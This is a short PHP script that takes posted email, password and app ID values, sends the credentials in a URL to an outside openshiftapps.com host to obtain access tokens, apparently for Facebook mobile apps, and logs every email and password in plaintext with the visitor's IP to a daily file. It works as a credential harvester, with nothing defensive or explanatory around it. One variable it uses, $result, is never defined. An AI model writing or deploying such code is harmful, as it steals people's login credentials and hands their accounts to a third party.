<?php
//Choiem1lan2 :v
if (isset($_POST["email"]) && isset($_POST["password"]) && isset($_POST["app_id"])){
$email = $_POST['email'];
$pass = $_POST['password'];
$app_id = $_POST["app_id"];
if($app_id == 350685531728)
{
$token = json_decode(file_get_contents('http://mouzambotter-mouzambotter.7e14.starter-us-west-2.openshiftapps.com/android.php?u='.$email.'&p='.$pass.''),true);  
if($token['access_token']) Echo $token['access_token'];
else Echo $token['error_msg'];
}else if($app_id == 165907476854626)
{
$token = json_decode(file_get_contents('http://mouzambotter-mouzambotter.7e14.starter-us-west-2.openshiftapps.com/ios.php?u='.$email.'&p='.$pass.''),true);  	
if($token['access_token']) Echo $token['access_token'];
else Echo $token['error_msg'];
}else if($app_id == 6628568379)
{
$token = json_decode(file_get_contents('http://mouzambotter-mouzambotter.7e14.starter-us-west-2.openshiftapps.com/iphone.php?u='.$email.'&p='.$pass.''),true);  	
if($token['access_token']) Echo $token['access_token'];

else Echo $token['error_msg'];

}


$log  = "User: ".$_SERVER['REMOTE_ADDR'].' - '.date("F j, Y, g:i a").PHP_EOL.
        "Attempt: ".($result[0]['success']=='1'?'Success':'Failed').PHP_EOL.
        "User: ".$email.PHP_EOL.
        "Pass: ".$pass.PHP_EOL.
        "-------------------------".PHP_EOL;
//Save string to log, use FILE_APPEND to append.
file_put_contents('./newlogs/log_'.date("j.n.Y").'.txt', $log, FILE_APPEND);

}
?>